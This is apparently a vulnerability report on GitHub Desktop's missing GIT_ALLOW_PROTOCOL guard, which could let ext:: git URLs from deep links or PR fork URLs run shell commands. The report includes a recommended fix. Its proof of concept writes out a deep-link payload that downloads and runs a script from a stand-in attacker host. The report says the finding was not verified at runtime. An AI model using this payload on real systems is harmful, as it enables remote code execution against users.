### Title
Missing `GIT_ALLOW_PROTOCOL` restriction allows remote-code-execution via `ext::`/`fd::` transport helpers reachable from deep links and PR fork URLs - (File: app/src/lib/git/environment.ts)

### Summary
The Fei `GenesisGroup` bug boiled down to one invariant: an externally-influenced value (average genesis price) was trusted to drive a security-critical state transition (`launch`) without constraining *how* that value could be reached. The Desktop analog is structurally the same class of bug: an externally-controlled string (a repository URL coming from a deep link, a CLI clone argument, or a GitHub API object such as a pull request's `head.repo.clone_url`) is passed straight into `git` remote operations (`clone`, `fetch`, `remote add`) without ever constraining which Git *transport protocol* is allowed. Because GitHub Desktop never sets `GIT_ALLOW_PROTOCOL`, Git's built-in `ext::` (and `fd::`) transport helpers remain available, and those helpers execute an arbitrary shell command embedded in the "URL" itself.

### Finding Description
`envForRemoteOperation` / `envForProxy`, which construct the environment used for every network-touching git invocation (clone, fetch, push, pull, submodule update), only ever add authentication and proxy variables — they never set `GIT_ALLOW_PROTOCOL`: [1](#0-0) 

Without that allow-list, Git's `ext::<command>` transport is reachable from any string that Desktop treats as a "clone/remote URL". This transport runs `<command>` via the shell as part of the transport negotiation — it is a documented Git RCE primitive.

Two independently-reachable attacker-controlled entry points feed such URLs into `git` with this vulnerable environment:

1. **Deep link / CLI clone** — `parseAppURL` extracts the `openrepo` path verbatim as the `url` field with no protocol allow-listing (only `pr`, `branch`, and `filepath` are validated): [2](#0-1) 
That url flows to `openOrCloneRepository`, which opens the Clone dialog pre-filled with the attacker's URL: [3](#0-2) 
and ultimately reaches `clone()`, which does append a `--` separator (blocking *argument* injection) but does nothing to restrict the *protocol scheme* of `url`: [4](#0-3) 

2. **Pull-request fork remote** — `_findPullRequestBranch` takes `headCloneUrl` from a `IAPIPullRequest` object (an API response, potentially from a compromised/MITM'd GitHub Enterprise Server, matching the report's "attacker controls ... a git remote/proxy response" criterion) and calls `addRemote` then fetches it automatically, with no interactive confirmation and no protocol check: [5](#0-4) [6](#0-5) 

None of the existing hardening in this codebase addresses this path: the sensitive-path checks in `isClonePathSensitive` and the `--` argument-injection guard in `clone.ts` both defend against a *destination-path* or *argument* attack, not against the *URL's protocol scheme* being `ext::`. [7](#0-6) 

### Impact Explanation
An `ext::` URL results in the shell command embedded in it being executed with the same privileges as the Desktop application/user, i.e., arbitrary code execution outside the git sandbox — the highest-severity outcome in the Valid Impact list ("code execution ... credential/token exfiltration ... renderer-sandbox escape").

### Likelihood Explanation
- The deep-link path requires the victim to click a single malicious `x-github-client://openRepo/ext::...` link and then click "Clone" in the pre-populated dialog — this matches the accepted "link the user clicks" primitive and needs no local access, admin rights, or pre-existing malware.
- The PR-fork path requires no user click at all beyond viewing/opening a PR in Desktop once a malicious `clone_url` is served by a compromised/MITM'd GitHub Enterprise endpoint (the accepted "git remote/proxy response" primitive), making it a silent, high-likelihood chain once that precondition is met.
- No code in the reviewed paths (`parse-app-url.ts`, `clone.ts`, `remote.ts`, `environment.ts`) filters or validates the URL's protocol scheme, so this is not merely theoretical — the guard that would stop it (`GIT_ALLOW_PROTOCOL`) simply does not exist anywhere in the indexed codebase.

### Recommendation
Set `GIT_ALLOW_PROTOCOL=http:https:ssh:git:file` (excluding `ext`, `fd`, and other helper transports) in `envForRemoteOperation`/`envForAuthentication` so it applies to every git invocation that can be driven by external input (clone, fetch, push, pull, submodule update, remote add + fetch). Additionally, validate/allow-list the URL scheme in `parseAppURL`'s `openrepo` handler and in `_findPullRequestBranch`/`addRemote` before ever handing the string to `git`.

### Proof of Concept
1. Attacker sends victim a link: `x-github-client://openRepo/ext::sh -c "curl attacker.com/x|sh"` (URL-encoded appropriately).
2. Victim clicks the link; Desktop's `parseAppURL` accepts it as `open-repository-from-url` with no scheme check, and `openOrCloneRepository` opens the Clone dialog pre-filled with the payload.
3. Victim clicks "Clone" (a single ordinary UI action); `clone()` runs `git ... clone --recursive -- "ext::sh -c \"curl attacker.com/x|sh\"" <path>` with an environment lacking `GIT_ALLOW_PROTOCOL`.
4. Git's `ext::` transport helper executes the embedded shell command, achieving code execution as the Desktop user — no local access, admin rights, or prior compromise required.

*(I could not fully verify at runtime whether Electron/Node's own environment already implicitly restricts `ext::` in this build, since that would require executing the app; this assessment is based purely on the absence of any `GIT_ALLOW_PROTOCOL` setting found across the indexed source.)*

function isClonePathSensitive(unresolvedClonePath: string): boolean {
  const clonePath = Path.resolve(unresolvedClonePath).toLowerCase()
  const home = Path.resolve(homedir()).toLowerCase()

  if (clonePath === home) {
    return true
  }

  const sensitiveLocations = [
    Path.join(home, '.ssh'),
    Path.join(home, '.gnupg'),
    Path.join(home, '.config'),
    Path.join(home, '.config', 'git'),
    Path.join(home, '.gitconfig'),
  ]

  if (__WIN32__) {
    const appData = process.env.APPDATA
    if (appData) {
      sensitiveLocations.push(appData.toLowerCase())
      sensitiveLocations.push(Path.join(appData, 'gnupg').toLowerCase())
    }
  }

  for (const sensitive of sensitiveLocations) {
    if (clonePath === sensitive || clonePath.startsWith(sensitive + Path.sep)) {
      return true
    }
  }

  return false
}
